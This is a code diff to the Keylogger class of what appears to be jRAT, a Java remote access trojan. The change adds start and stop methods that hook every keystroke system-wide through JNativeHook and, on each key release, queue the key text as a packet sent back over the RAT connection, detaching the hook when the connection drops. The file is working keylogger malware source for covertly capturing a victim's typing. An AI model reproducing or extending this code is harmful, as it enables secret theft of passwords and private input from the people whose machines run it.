@@ -1,16 +1,13 @@
 package jrat.module.keys;
 
 import jrat.client.Connection;
+import jrat.common.listeners.ConnectionListener;
 import jrat.module.keys.packets.PacketKey;
+import org.jnativehook.GlobalScreen;
 import org.jnativehook.keyboard.NativeKeyEvent;
 import org.jnativehook.keyboard.NativeKeyListener;
 
-import java.util.ArrayList;
-import java.util.List;
-
-public class Keylogger implements NativeKeyListener {
-
-    public static List<String> chars = new ArrayList<>();
+public class Keylogger implements NativeKeyListener, ConnectionListener {
 
     public static Keylogger instance;
 
@@ -20,20 +17,44 @@ public class Keylogger implements NativeKeyListener {
         this.con = con;
     }
 
-	@Override
+    /**
+     * Registers this key listener
+     */
+    public void start() {
+        if (instance != null) {
+            System.err.println("instance already set");
+        }
+
+        instance = this;
+
+        con.addConnectionListener(this);
+        GlobalScreen.addNativeKeyListener(this);
+    }
+
+    /**
+     * Unregisters this key listener
+     */
+    public void stop() {
+        GlobalScreen.removeNativeKeyListener(this);
+        instance = null;
+    }
+
 	public void nativeKeyPressed(NativeKeyEvent e) {
 
 	}
 
-	@Override
 	public void nativeKeyReleased(NativeKeyEvent e) {
         String text = NativeKeyEvent.getKeyText(e.getKeyCode());
 
         con.addToSendQueue(new PacketKey(text));
 	}
 
-	@Override
 	public void nativeKeyTyped(NativeKeyEvent e) {
 
+    }
+
+    public void onDisconnect(Exception ex) {
+        this.stop();
+        con.removeConnectionListener(this);
     }
 }
